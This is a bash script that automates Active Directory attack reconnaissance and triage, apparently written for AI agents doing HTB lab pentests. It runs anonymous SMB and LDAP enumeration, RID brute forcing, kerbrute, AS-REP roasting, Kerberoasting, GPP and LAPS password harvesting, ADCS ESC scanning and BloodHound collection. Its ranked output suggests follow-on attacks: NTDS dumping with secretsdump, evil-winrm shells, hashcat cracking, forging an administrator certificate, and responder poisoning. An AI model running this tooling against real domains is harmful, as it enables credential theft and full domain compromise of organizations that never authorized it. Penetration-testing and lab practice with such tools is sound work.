#!/bin/bash
# ad-auto.sh — Deterministic Active Directory recon & triage in one shot.
#
# PURPOSE
#   Encapsulates AD attack-tree expertise so a model with weak AD priors does
#   NOT need to know the tree. It just runs this script and READS a prioritized
#   findings list (reports/<slug>/ad-findings.md). Each finding is mapped to a
#   STATE in playbooks/runbooks/ad-decision-runbook.md and carries the single
#   suggested next command. Quick wins (AS-REP, Kerberoast, ADCS ESC, DCSync,
#   weak ACLs) are ranked first.
#
# USAGE
#   bash scripts/ad-auto.sh --dc <dc-ip> --domain <domain> \
#        [--user <u> --pass <p> | --hash <ntlm>] [--userlist <file>] [--force]
#
# EXAMPLES
#   bash scripts/ad-auto.sh --dc 10.10.10.50 --domain support.htb
#   bash scripts/ad-auto.sh --dc 10.10.10.50 --domain support.htb \
#        --user ldap --pass 'Pass123' --userlist users.txt
#   bash scripts/ad-auto.sh --dc 10.10.10.50 --domain support.htb \
#        --user admin --hash aad3b435b51404eeaad3b435b51404ee:<nthash>
#
# DESIGN NOTES
#   - TIMEBOXED: every network call runs under scripts/timebox.sh.
#   - IDEMPOTENT: a check whose output already exists is skipped; pass --force
#     to redo everything.
#   - SAFE: each tool is probed with `command -v`; missing tools are skipped
#     with a warning. One absent tool NEVER hard-fails the run.
#   - ADDITIVE: writes only under reports/<slug>/. Reuses new-target.sh layout.
#
# Operator: Zuzu 🐱‍💻   |   AUTHORIZED HTB / lab use only.

set -uo pipefail   # NOT -e: a failing/absent tool must not abort the sweep.

WS="$(cd "$(dirname "$0")/.." && pwd)"
TIMEBOX="$WS/scripts/timebox.sh"
NEWTARGET="$WS/scripts/new-target.sh"

# ── Timebox budgets (seconds) ──────────────────────────────────────────────
T_QUICK=60      # single nxc/ldap probe
T_RID=120       # rid-brute
T_KERBRUTE=180  # userenum against a wordlist
T_ROAST=120     # GetNPUsers / GetUserSPNs
T_BH=300        # bloodhound full collection
T_CERTIPY=180   # certipy find

# ── Defaults ───────────────────────────────────────────────────────────────
DC=""; DOMAIN=""; USER=""; PASS=""; HASH=""; USERLIST=""; FORCE="0"

usage() {
  cat <<EOF
ad-auto.sh — deterministic AD recon → prioritized findings

Usage:
  bash scripts/ad-auto.sh --dc <dc-ip> --domain <domain> \\
       [--user <u> --pass <p> | --hash <ntlm>] [--userlist <file>] [--force]

Required:
  --dc <ip>          Domain Controller IP (becomes the report SLUG)
  --domain <fqdn>    AD domain FQDN, e.g. support.htb

Optional:
  --user <u>         Domain username (enables the AUTHED sweep)
  --pass <p>         Password for --user
  --hash <ntlm>      NT hash (LM:NT or :NT) — alternative to --pass
  --userlist <file>  Username wordlist for kerbrute / AS-REP roast
  --force            Re-run every check even if output already exists

Output:
  reports/<dc-ip>/ad-findings.md   ← prioritized, STATE-mapped findings
  reports/<dc-ip>/creds/           ← raw tool output
  reports/<dc-ip>/loot/            ← bloodhound zip, dumps
EOF
  exit 2
}

# ── Arg parsing ────────────────────────────────────────────────────────────
while [[ $# -gt 0 ]]; do
  case "$1" in
    --dc)        DC="${2:-}"; shift 2 ;;
    --domain)    DOMAIN="${2:-}"; shift 2 ;;
    --user)      USER="${2:-}"; shift 2 ;;
    --pass)      PASS="${2:-}"; shift 2 ;;
    --hash)      HASH="${2:-}"; shift 2 ;;
    --userlist)  USERLIST="${2:-}"; shift 2 ;;
    --force)     FORCE="1"; shift ;;
    -h|--help)   usage ;;
    *) echo "❌ Unknown argument: $1" >&2; usage ;;
  esac
done

[[ -z "$DC" || -z "$DOMAIN" ]] && { echo "❌ --dc and --domain are required." >&2; usage; }

# ── Derived values ─────────────────────────────────────────────────────────
# SLUG from the DC IP — identical sanitization to new-target.sh.
SLUG="$(echo "$DC" | tr '/' '-' | tr -cd 'a-zA-Z0-9._-')"
DIR="$WS/reports/$SLUG"
BASE_DN="DC=$(echo "$DOMAIN" | sed 's/\./,DC=/g')"

# Authed if we have a user plus a secret.
AUTHED="0"
if [[ -n "$USER" && ( -n "$PASS" || -n "$HASH" ) ]]; then AUTHED="1"; fi
# A lone --hash with no --user is unusable for these tools; warn and drop it.
if [[ "$AUTHED" == "0" && -n "$HASH" && -z "$USER" ]]; then
  echo "⚠️  --hash given without --user; ignoring (need a username to authenticate)."
fi

# ── Create/confirm the per-target folder via the canonical scaffolder ──────
if [[ -x "$NEWTARGET" || -f "$NEWTARGET" ]]; then
  bash "$NEWTARGET" "$DC" "$DOMAIN" >/dev/null 2>&1 || true
fi
mkdir -p "$DIR"/{nmap,web,creds,loot,exploits,tunnels}
mkdir -p "$DIR/loot/bloodhound"
CRED="$DIR/creds"
LOOT="$DIR/loot"
FINDINGS="$DIR/ad-findings.md"
# Ranked-finding accumulator: PRIORITY|STATE|TITLE|DETAIL|NEXTCMD
FTMP="$(mktemp)"
trap 'rm -f "$FTMP"' EXIT

# ── Tool resolution (prefer modern tools; fall back to legacy names) ───────
# Resolve the first available executable from a candidate list into a var.
resolve() {  # resolve VARNAME cand1 cand2 ...
  local __var="$1"; shift
  local c
  for c in "$@"; do
    if command -v "$c" >/dev/null 2>&1; then printf -v "$__var" '%s' "$c"; return 0; fi
  done
  printf -v "$__var" '%s' ""
  return 1
}

resolve NXC        nxc netexec crackmapexec
resolve KERBRUTE   kerbrute
resolve GETNPUSERS impacket-GetNPUsers GetNPUsers.py
resolve GETSPNS    impacket-GetUserSPNs GetUserSPNs.py
resolve BLOODHOUND bloodhound-python
resolve CERTIPY    certipy-ad certipy
resolve LDAPSEARCH ldapsearch
resolve RESPONDER  responder   # relay/poison (not run here; presence flagged)

warn_missing() {  # warn_missing VAR "friendly name" "what breaks"
  local v="${!1:-}"
  if [[ -z "$v" ]]; then
    echo "⚠️  MISSING: $2 — $3 (skipping those checks)"
    return 1
  fi
  return 0
}

# ── Findings helper ────────────────────────────────────────────────────────
add_finding() {  # add_finding PRIORITY STATE TITLE DETAIL NEXTCMD
  printf '%s|%s|%s|%s|%s\n' "$1" "$2" "$3" "$4" "$5" >> "$FTMP"
}

# ── Timeboxed, idempotent step runner ──────────────────────────────────────
# tb OUTFILE BUDGET CMD...     (pipe-heavy commands: pass as: bash -c '...')
tb() {
  local out="$1"; local budget="$2"; shift 2
  if [[ -s "$out" && "$FORCE" != "1" ]]; then
    echo "  ⏭  skip (exists): $(basename "$out")   [--force to redo]"
    return 0
  fi
  echo "  ▶ ${*}"
  "$TIMEBOX" "$budget" "$@" > "$out" 2>&1
  local rc=$?
  if [[ $rc -eq 124 ]]; then
    echo "  ⏱  timed out (${budget}s) — partial output kept in $(basename "$out")"
  fi
  return 0
}

hasout() { [[ -s "$1" ]]; }   # convenience: non-empty output file

echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  🎯 ad-auto — deterministic AD sweep                            "
echo "╠══════════════════════════════════════════════════════════════╣"
echo "║  DC:      $DC"
echo "║  Domain:  $DOMAIN   (base DN: $BASE_DN)"
echo "║  Mode:    $([[ "$AUTHED" == "1" ]] && echo "AUTHENTICATED as $USER" || echo "UNAUTHENTICATED")"
echo "║  Reports: reports/$SLUG/"
echo "╚══════════════════════════════════════════════════════════════╝"

# Build nxc/impacket credential fragments once.
NXC_AUTH=(); IMPACKET_SECRET=""; BH_AUTH=(); CERTIPY_AUTH=()
if [[ "$AUTHED" == "1" ]]; then
  if [[ -n "$PASS" ]]; then
    NXC_AUTH=(-u "$USER" -p "$PASS")
    IMPACKET_SECRET="$DOMAIN/$USER:$PASS"
    BH_AUTH=(-u "$USER" -p "$PASS")
    CERTIPY_AUTH=(-u "$USER@$DOMAIN" -p "$PASS")
  else
    NXC_AUTH=(-u "$USER" -H "$HASH")
    IMPACKET_SECRET="$DOMAIN/$USER"      # combined with -hashes below
    BH_AUTH=(-u "$USER" --hashes "$HASH")
    CERTIPY_AUTH=(-u "$USER@$DOMAIN" -hashes "$HASH")
  fi
fi

# ═══════════════════════════════════════════════════════════════════════════
# STAGE 1 — HOST / DOMAIN IDENTITY + SIGNING POSTURE (always)   → STATE 0/A
# ═══════════════════════════════════════════════════════════════════════════
echo ""
echo "── STAGE 1: host & domain identity, signing posture ──"
SMB_INFO="$CRED/nxc_smb_info.txt"
if warn_missing NXC "nxc/netexec" "can't fingerprint SMB or enumerate"; then
  tb "$SMB_INFO" "$T_QUICK" "$NXC" smb "$DC"
  if hasout "$SMB_INFO"; then
    # Signing status drives coercion/relay posture (STATE A5).
    if grep -qiE 'signing:? *False' "$SMB_INFO"; then
      add_finding 40 "A5" "SMB signing DISABLED on DC" \
        "nxc reports signing:False — DC is a viable NTLM relay target." \
        "$NXC smb $DC --gen-relay-list $CRED/relay_targets.txt   # then relay per ad-coercion-and-relay.md"
    fi
    # Relay-target list (hosts with signing off) when authed context helps too.
    tb "$CRED/relay_targets.txt" "$T_QUICK" "$NXC" smb "$DC" --gen-relay-list "$CRED/relay_targets.txt" || true
  fi
fi

# ═══════════════════════════════════════════════════════════════════════════
# STAGE 2 — UNAUTH SWEEP (always run; the cheap doors)          → STATE A
# ═══════════════════════════════════════════════════════════════════════════
echo ""
echo "── STAGE 2: unauthenticated enumeration (STATE A) ──"

# A1. Anonymous / null / guest SMB shares + users
if [[ -n "$NXC" ]]; then
  tb "$CRED/nxc_smb_null_shares.txt" "$T_QUICK" "$NXC" smb "$DC" -u '' -p '' --shares
  tb "$CRED/nxc_smb_null_users.txt"  "$T_QUICK" "$NXC" smb "$DC" -u '' -p '' --users
  tb "$CRED/nxc_smb_guest_shares.txt" "$T_QUICK" "$NXC" smb "$DC" -u 'guest' -p '' --shares
  # RID cycling — build a user list without creds.
  tb "$CRED/nxc_rid_brute.txt" "$T_RID" "$NXC" smb "$DC" -u 'guest' -p '' --rid-brute 10000
  if [[ ! -s "$CRED/nxc_rid_brute.txt" || "$FORCE" == "1" ]]; then
    tb "$CRED/nxc_rid_brute.txt" "$T_RID" "$NXC" smb "$DC" -u '' -p '' --rid-brute 10000 || true
  fi

  # Findings: readable null/guest shares.
  for sf in "$CRED/nxc_smb_null_shares.txt" "$CRED/nxc_smb_guest_shares.txt"; do
    if [[ -s "$sf" ]] && grep -qiE 'READ|WRITE' "$sf"; then
      add_finding 30 "A" "Anonymous/guest-readable SMB share(s)" \
        "Readable shares in $(basename "$sf") — mine for creds/usernames." \
        "$NXC smb $DC -u '' -p '' --shares   # then smbclient //$DC/<share> -N"
      break
    fi
  done
  # Null-session user list disclosure.
  if [[ -s "$CRED/nxc_smb_null_users.txt" ]] && grep -qi 'sAMAccountName\|\\' "$CRED/nxc_smb_null_users.txt"; then
    add_finding 50 "A" "Users enumerable via null session" \
      "Domain users leaked via anonymous SMB — feed into AS-REP/spray." \
      "$NXC smb $DC -u '' -p '' --users"
  fi
fi

# A1b. LDAP anonymous naming contexts + user dump
if warn_missing LDAPSEARCH "ldapsearch" "can't test anonymous LDAP"; then
  tb "$CRED/ldap_namingcontexts.txt" "$T_QUICK" \
     "$LDAPSEARCH" -x -H "ldap://$DC" -s base namingcontexts
  tb "$CRED/ldap_anon_users.txt" "$T_QUICK" \
     "$LDAPSEARCH" -x -H "ldap://$DC" -b "$BASE_DN" "(objectClass=user)" sAMAccountName
  if [[ -s "$CRED/ldap_anon_users.txt" ]] && grep -qi 'sAMAccountName:' "$CRED/ldap_anon_users.txt"; then
    add_finding 35 "A" "Anonymous LDAP bind leaks users" \
      "Anonymous LDAP returned user objects — harvest sAMAccountName list." \
      "$LDAPSEARCH -x -H ldap://$DC -b '$BASE_DN' '(objectClass=user)' sAMAccountName"
  fi
fi

# ── Build a consolidated users.txt from discovery + provided list ──────────
USERS_FILE="$CRED/users.txt"
build_users() {
  local tmp; tmp="$(mktemp)"
  # From RID brute (SidTypeUser rows): "1104: DOMAIN\jsmith (SidTypeUser)"
  [[ -s "$CRED/nxc_rid_brute.txt" ]] && \
    grep -i 'SidTypeUser' "$CRED/nxc_rid_brute.txt" 2>/dev/null \
      | sed -E 's/.*\\([^ ]+) *\(SidTypeUser\).*/\1/' >> "$tmp"
  # From anonymous LDAP dump.
  [[ -s "$CRED/ldap_anon_users.txt" ]] && \
    grep -i '^sAMAccountName:' "$CRED/ldap_anon_users.txt" 2>/dev/null \
      | awk '{print $2}' >> "$tmp"
  # From provided userlist.
  [[ -n "$USERLIST" && -f "$USERLIST" ]] && cat "$USERLIST" >> "$tmp"
  # Dedup, drop machine accounts ($) and blanks.
  grep -vE '\$$' "$tmp" 2>/dev/null | sed '/^$/d' | sort -u > "$USERS_FILE"
  rm -f "$tmp"
}
build_users
NUSERS=$( [[ -s "$USERS_FILE" ]] && wc -l < "$USERS_FILE" || echo 0 )
echo "  ℹ️  consolidated user list: $NUSERS name(s) → $(basename "$USERS_FILE")"

# A3. Kerbrute userenum (only if we have a list to test)
if [[ -n "$KERBRUTE" ]]; then
  KB_LIST=""
  if [[ -n "$USERLIST" && -f "$USERLIST" ]]; then
    KB_LIST="$USERLIST"
  elif [[ -f /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt ]]; then
    KB_LIST="/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
  fi
  if [[ -n "$KB_LIST" ]]; then
    tb "$CRED/kerbrute_userenum.txt" "$T_KERBRUTE" \
       "$KERBRUTE" userenum -d "$DOMAIN" --dc "$DC" "$KB_LIST" -t 50
    if [[ -s "$CRED/kerbrute_userenum.txt" ]] && grep -qi 'VALID USERNAME' "$CRED/kerbrute_userenum.txt"; then
      # Merge kerbrute valid users into users.txt.
      grep -i 'VALID USERNAME' "$CRED/kerbrute_userenum.txt" \
        | grep -oE '[A-Za-z0-9._-]+@'"$DOMAIN" | sed 's/@.*//' >> "$USERS_FILE"
      sort -u -o "$USERS_FILE" "$USERS_FILE"
      add_finding 45 "A3" "Valid usernames confirmed via Kerberos" \
        "kerbrute validated usernames (no creds needed) — now AS-REP roast them." \
        "$GETNPUSERS $DOMAIN/ -dc-ip $DC -usersfile $USERS_FILE -no-pass -format hashcat"
    fi
  else
    echo "  ⚠️  no --userlist and no seclists xato list found — skipping kerbrute userenum."
  fi
else
  warn_missing KERBRUTE "kerbrute" "can't do Kerberos user enumeration" || true
fi

# A4. AS-REP roast on discovered/provided users (quick win)
if warn_missing GETNPUSERS "impacket GetNPUsers" "can't AS-REP roast"; then
  if [[ -s "$USERS_FILE" ]]; then
    tb "$CRED/asrep.txt" "$T_ROAST" \
       "$GETNPUSERS" "$DOMAIN/" -dc-ip "$DC" -usersfile "$USERS_FILE" -no-pass -format hashcat
    if [[ -s "$CRED/asrep.txt" ]] && grep -q '\$krb5asrep\$' "$CRED/asrep.txt"; then
      grep '\$krb5asrep\$' "$CRED/asrep.txt" > "$CRED/asrep_hashes.txt"
      NH=$(wc -l < "$CRED/asrep_hashes.txt")
      add_finding 10 "A4→B" "AS-REP roastable account(s) [$NH]" \
        "Users without Kerberos pre-auth — crack offline for cleartext creds (QUICK WIN)." \
        "hashcat -m 18200 $CRED/asrep_hashes.txt /usr/share/wordlists/rockyou.txt"
    fi
  else
    echo "  ⚠️  no users discovered — skipping AS-REP roast."
  fi
fi

# ═══════════════════════════════════════════════════════════════════════════
# STAGE 3 — AUTHED SWEEP (only with creds/hash)                 → STATE B
# ═══════════════════════════════════════════════════════════════════════════
if [[ "$AUTHED" == "1" ]]; then
  echo ""
  echo "── STAGE 3: authenticated enumeration (STATE B) as $USER ──"

  # B1. Validate + reach: SMB (local-admin?), WinRM, shares/users/groups/pass-pol
  if [[ -n "$NXC" ]]; then
    tb "$CRED/nxc_smb_auth.txt"   "$T_QUICK" "$NXC" smb   "$DC" "${NXC_AUTH[@]}"
    tb "$CRED/nxc_winrm_auth.txt" "$T_QUICK" "$NXC" winrm "$DC" "${NXC_AUTH[@]}"
    tb "$CRED/nxc_smb_enum.txt"   "$T_QUICK" "$NXC" smb   "$DC" "${NXC_AUTH[@]}" --shares --users --groups --pass-pol

    if [[ -s "$CRED/nxc_smb_auth.txt" ]] && grep -q 'Pwn3d!' "$CRED/nxc_smb_auth.txt"; then
      add_finding 20 "C" "Local admin on DC (Pwn3d! over SMB)" \
        "Credentials are local admin — dump secrets / NTDS." \
        "impacket-secretsdump $IMPACKET_SECRET@$DC $([[ -n \"$HASH\" ]] && echo -hashes :$HASH) -just-dc"
    fi
    if [[ -s "$CRED/nxc_winrm_auth.txt" ]] && grep -q 'Pwn3d!' "$CRED/nxc_winrm_auth.txt"; then
      add_finding 22 "C" "WinRM shell available (Pwn3d! over WinRM)" \
        "Interactive foothold via WinRM." \
        "evil-winrm -i $DC -u $USER $([[ -n \"$PASS\" ]] && echo \"-p '$PASS'\" || echo \"-H $HASH\")"
    fi
    # Credential-hunting modules (cheap).
    tb "$CRED/nxc_gpp_password.txt" "$T_QUICK" "$NXC" smb  "$DC" "${NXC_AUTH[@]}" -M gpp_password || true
    tb "$CRED/nxc_laps.txt"         "$T_QUICK" "$NXC" ldap "$DC" "${NXC_AUTH[@]}" -M laps || true
    if [[ -s "$CRED/nxc_gpp_password.txt" ]] && grep -qi 'password\|cpassword' "$CRED/nxc_gpp_password.txt"; then
      add_finding 16 "B6" "GPP cPassword in SYSVOL" \
        "Group Policy Preferences password recoverable (decryptable)." \
        "$NXC smb $DC ${NXC_AUTH[*]} -M gpp_password"
    fi
    if [[ -s "$CRED/nxc_laps.txt" ]] && grep -qi 'ms-mcs-admpwd\|LAPS' "$CRED/nxc_laps.txt"; then
      add_finding 17 "B6" "LAPS password readable" \
        "You can read ms-Mcs-AdmPwd — local admin on that host." \
        "$NXC ldap $DC ${NXC_AUTH[*]} -M laps"
    fi
  fi

  # B3. Kerberoast (quick win)
  if warn_missing GETSPNS "impacket GetUserSPNs" "can't Kerberoast"; then
    if [[ -n "$HASH" ]]; then
      tb "$CRED/kerberoast.txt" "$T_ROAST" \
         "$GETSPNS" "$IMPACKET_SECRET" -hashes ":$HASH" -dc-ip "$DC" -request \
         -outputfile "$CRED/kerberoast_hashes.txt"
    else
      tb "$CRED/kerberoast.txt" "$T_ROAST" \
         "$GETSPNS" "$DOMAIN/$USER:$PASS" -dc-ip "$DC" -request \
         -outputfile "$CRED/kerberoast_hashes.txt"
    fi
    if { [[ -s "$CRED/kerberoast_hashes.txt" ]] && grep -q '\$krb5tgs\$' "$CRED/kerberoast_hashes.txt"; } \
       || { [[ -s "$CRED/kerberoast.txt" ]] && grep -q '\$krb5tgs\$' "$CRED/kerberoast.txt"; }; then
      add_finding 11 "B3" "Kerberoastable SPN account(s)" \
        "Service accounts with SPNs — crack TGS offline (QUICK WIN)." \
        "hashcat -m 13100 $CRED/kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt"
    fi
  fi

  # B4. ADCS ESC scan (high win rate)
  if warn_missing CERTIPY "certipy" "can't scan ADCS for ESC"; then
    tb "$CRED/certipy_vuln.txt" "$T_CERTIPY" \
       "$CERTIPY" find "${CERTIPY_AUTH[@]}" -dc-ip "$DC" -vulnerable -stdout
    if [[ -s "$CRED/certipy_vuln.txt" ]] && grep -qiE 'ESC[0-9]+' "$CRED/certipy_vuln.txt"; then
      ESCS=$(grep -oiE 'ESC[0-9]+' "$CRED/certipy_vuln.txt" | sort -u | tr '\n' ' ')
      add_finding 12 "B4→D" "ADCS vulnerable template(s): $ESCS" \
        "Certipy reports vulnerable ESC path(s) — often a direct route to DA (QUICK WIN)." \
        "see knowledge-base/mitre-attack/techniques/adcs-esc-deep.md ; certipy req ${CERTIPY_AUTH[*]} -dc-ip $DC -ca <CA> -template <VULN> -upn administrator@$DOMAIN"
    fi
  fi

  # B2. BloodHound full collection into loot/bloodhound/
  if warn_missing BLOODHOUND "bloodhound-python" "no graph for ACL/DCSync analysis"; then
    BH_MARK="$LOOT/bloodhound/.collected"
    if [[ -f "$BH_MARK" && "$FORCE" != "1" ]]; then
      echo "  ⏭  skip (exists): bloodhound collection   [--force to redo]"
    else
      ( cd "$LOOT/bloodhound" && \
        "$TIMEBOX" "$T_BH" "$BLOODHOUND" "${BH_AUTH[@]}" -d "$DOMAIN" -dc "$DOMAIN" \
          -ns "$DC" -c All --zip ) > "$CRED/bloodhound.log" 2>&1
      if ls "$LOOT/bloodhound/"*.zip >/dev/null 2>&1 || ls "$LOOT/bloodhound/"*.json >/dev/null 2>&1; then
        touch "$BH_MARK"
        add_finding 14 "B2/B5" "BloodHound data collected — review ACL edges" \
          "Full collection in loot/bloodhound/. Mark owned, run Shortest Path to Domain Admin; look for GenericAll/WriteDacl/ForceChangePassword/AddKeyCredentialLink/DCSync." \
          "load loot/bloodhound/*.zip in BloodHound → map edges via knowledge-base/checklists/bloodhound-edge-to-action.md"
      else
        echo "  ⚠️  bloodhound-python produced no output (see creds/bloodhound.log) — check DNS/clock."
      fi
    fi
  fi
else
  echo ""
  echo "── STAGE 3: AUTHED sweep skipped (no --user + secret) ──"
fi

# ═══════════════════════════════════════════════════════════════════════════
# STAGE 4 — WRITE PRIORITIZED FINDINGS  → reports/<slug>/ad-findings.md
# ═══════════════════════════════════════════════════════════════════════════
echo ""
echo "── STAGE 4: writing prioritized findings ──"

{
  echo "# AD Findings — $DOMAIN via DC $DC"
  echo ""
  echo "> Generated by \`scripts/ad-auto.sh\` on $(date -Iseconds)."
  echo "> Mode: $([[ "$AUTHED" == "1" ]] && echo "AUTHENTICATED as \`$USER\`" || echo "UNAUTHENTICATED")."
  echo "> STATE references map to \`playbooks/runbooks/ad-decision-runbook.md\`."
  echo "> Raw tool output: \`reports/$SLUG/creds/\` and \`reports/$SLUG/loot/\`."
  echo ""
  echo "Quick wins (AS-REP, Kerberoast, ADCS ESC, DCSync, weak ACLs) are ranked first."
  echo ""

  if [[ -s "$FTMP" ]]; then
    echo "## Prioritized findings"
    echo ""
    RANK=0
    # Sort by numeric priority (col 1). Lower = more urgent.
    sort -t'|' -k1,1n "$FTMP" | while IFS='|' read -r prio state title detail nextcmd; do
      RANK=$((RANK+1))
      echo "### $RANK. $title"
      echo ""
      echo "- **Runbook STATE:** $state"
      echo "- **What:** $detail"
      echo "- **Next command:**"
      echo ""
      echo '  ```bash'
      echo "  $nextcmd"
      echo '  ```'
      echo ""
    done
  else
    echo "## No actionable findings"
    echo ""
    echo "No quick-win primitives surfaced from the automated sweep."
    echo "Next moves (see runbook STATE A5): poisoning + coercion + relay."
    echo ""
    echo '```bash'
    echo "# Requires responder (flag if missing) — see knowledge-base/checklists/ad-coercion-and-relay.md"
    echo "sudo responder -I tun0 -dwv"
    echo '```'
    echo ""
  fi

  echo "## Tool availability"
  echo ""
  echo "| Tool | Resolved as | Status |"
  echo "|------|-------------|--------|"
  echo "| netexec | ${NXC:-—} | $([[ -n "$NXC" ]] && echo present || echo MISSING) |"
  echo "| kerbrute | ${KERBRUTE:-—} | $([[ -n "$KERBRUTE" ]] && echo present || echo MISSING) |"
  echo "| GetNPUsers | ${GETNPUSERS:-—} | $([[ -n "$GETNPUSERS" ]] && echo present || echo MISSING) |"
  echo "| GetUserSPNs | ${GETSPNS:-—} | $([[ -n "$GETSPNS" ]] && echo present || echo MISSING) |"
  echo "| bloodhound-python | ${BLOODHOUND:-—} | $([[ -n "$BLOODHOUND" ]] && echo present || echo MISSING) |"
  echo "| certipy | ${CERTIPY:-—} | $([[ -n "$CERTIPY" ]] && echo present || echo MISSING) |"
  echo "| ldapsearch | ${LDAPSEARCH:-—} | $([[ -n "$LDAPSEARCH" ]] && echo present || echo MISSING) |"
  echo "| responder | ${RESPONDER:-—} | $([[ -n "$RESPONDER" ]] && echo present || echo 'MISSING (needed for STATE A5 relay/coercion)') |"
  echo ""
} > "$FINDINGS"

echo "  📄 wrote $FINDINGS"

# ═══════════════════════════════════════════════════════════════════════════
# STAGE 5 — HUMAN SUMMARY + TOP 3 NEXT ACTIONS
# ═══════════════════════════════════════════════════════════════════════════
echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  ✅ ad-auto complete — $DOMAIN @ $DC"
echo "╚══════════════════════════════════════════════════════════════╝"

NFIND=$( [[ -s "$FTMP" ]] && wc -l < "$FTMP" || echo 0 )
echo "Findings: $NFIND   |   Report: reports/$SLUG/ad-findings.md"
echo ""
echo "🔝 Top 3 next actions:"
if [[ -s "$FTMP" ]]; then
  sort -t'|' -k1,1n "$FTMP" | head -n 3 | awk -F'|' '{printf "  %d. [%s] %s\n       → %s\n", NR, $2, $3, $5}'
else
  echo "  1. [A5] No quick wins — pivot to poisoning/coercion/relay (needs responder)."
  echo "  2. [A]  Re-check anonymous shares/LDAP manually for leaked creds."
  echo "  3. [A3] Run kerbrute with a bigger username list to seed AS-REP roasting."
fi

# Flag tools that may be missing (explicitly call out responder/certipy).
MISS=()
[[ -z "$RESPONDER" ]] && MISS+=("responder (STATE A5 relay/coercion)")
[[ -z "$CERTIPY"   ]] && MISS+=("certipy (ADCS ESC scan)")
[[ -z "$NXC"       ]] && MISS+=("nxc/netexec (core enumeration)")
[[ -z "$BLOODHOUND" ]] && MISS+=("bloodhound-python (ACL graph)")
if [[ ${#MISS[@]} -gt 0 ]]; then
  echo ""
  echo "⚠️  Missing tools worth installing:"
  for m in "${MISS[@]}"; do echo "   - $m"; done
fi
echo ""
